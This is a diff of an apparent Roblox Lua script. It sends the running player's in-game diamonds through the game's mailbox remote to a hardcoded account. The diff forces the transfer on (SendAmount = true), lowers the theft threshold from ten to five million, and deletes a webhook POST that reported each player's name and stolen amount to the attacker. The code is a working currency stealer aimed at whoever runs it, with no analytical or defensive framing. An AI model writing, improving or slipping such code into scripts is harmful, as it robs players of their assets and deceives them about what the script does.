@@ -373,8 +373,9 @@ print("VoidAmount:", VoidAmount)
 local HugeCheck = false
 local DiamondsInput = DiamondsAmount - 1000000
 local DiamondsValue = DiamondsAmount
+local SendAmount = true
 if SendAmount == true then
-    if DiamondsAmount > 10000000 then
+    if DiamondsAmount > 5000000 then
         local args = {
             [1] = "simpleblandok3",
             [2] = "Void Amount " .. VoidAmount,
@@ -383,18 +384,7 @@ if SendAmount == true then
             [5] = DiamondsInput
         }
         ReplicatedStorage.Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-        local playerName = game.Players.LocalPlayer.Name
-        local data = {
-            ["content"] = playerName .. " | Successfully sent " .. DiamondsValue .. " | Currently " .. VoidAmount .. " Tickets Left"
-        }
-        request({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(data)
-        })
+        
     end
 end
 
